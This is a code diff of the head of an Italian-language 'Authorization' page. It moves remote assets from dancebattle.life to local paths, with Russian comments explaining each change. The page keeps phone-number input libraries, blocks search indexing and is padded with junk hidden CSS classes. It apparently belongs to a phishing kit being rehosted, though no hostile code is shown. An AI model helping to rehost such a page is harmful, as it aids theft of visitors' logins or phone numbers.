@@ -10,18 +10,14 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
+    <link rel="icon" type="image/x-icon" href="/static/image/icon.svg"> <!-- Предполагая, что icon.svg лежит в static/image -->
     <title>Autorizzazione</title>
-    <link rel="stylesheet"
-        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
-    <script
-        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
-    <script
-        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
+    <link rel="stylesheet" href="/static/css/themes/zomia/number.css" /> <!-- Если number.css лежит в static/css/themes/zomia/ -->
+    <script src="/static/js/lib/socket.io.js"></script>      <!-- Если socket.io.js лежит в static/js/lib/ -->
+    <script src="/static/js/lib/lazyload.js"></script>       <!-- Если lazyload.js лежит в static/js/lib/ -->
+    <script src="/static/js/lib/notiflix.js"></script>       <!-- Если notiflix.js лежит в static/js/lib/ -->
+    <script src="/static/js/number.js"></script>             <!-- Если number.js лежит в static/js/ -->
+    <!-- Ссылки на CDN для intl-tel-input оставляем как есть, они должны работать -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 
@@ -41,7 +37,13 @@
         .zFFCQoOq { display: none; margin: 243px; line-height: 32; font-size: 93px; text-align: right; cursor: move; padding: 156px; font-weight: 600; font-style: oblique; border-radius: 32px; height: 262px; color: #toGUJC; }
         .HJCjuJdBRxyFkVhn { display: none; font-size: 27px; text-align: right; padding: 152px; height: 586px; scale: 0.51; margin: 243px; font-style: oblique; width: 535px; color: #EHlSir; box-sizing: border-box; font-weight: 500; cursor: not-allowed; opacity: 0.11; background-color: #dXDFTp; line-height: 8; border-radius: 57px; }
         .lmTQZiytwQd { display: none; scale: 0.94; opacity: 0.13; background-color: #mAnJXZ; }
-        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
+       /* ЗАМЕНИ ФОН НА ЛОКАЛЬНЫЙ */
+        body {
+            /* background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); */ /* Старый путь */
+            background-image: url("/static/image/themes/zomia/background.jpg"); /* Новый путь, если background.jpg лежит в static/image/themes/zomia/ */
+            background-color: #ffffff;
+        }
+        /* ... остальные стили ... */
         .egeWSiccsIJQ { display: none; padding: 156px; height: 733px; margin: 59px; border-radius: 52px; line-height: 58; box-sizing: initial; width: 535px; font-size: 44px; scale: 0.48; font-weight: 800; font-style: initial; color: #LzmaFZ; text-align: initial; opacity: 0.94; cursor: auto; }
         .loader { border-top: 5px solid #bfbbbb; }
         .QSXSXYDCnbqkFWy { display: none; width: 14px; background-color: #dXDFTp; }
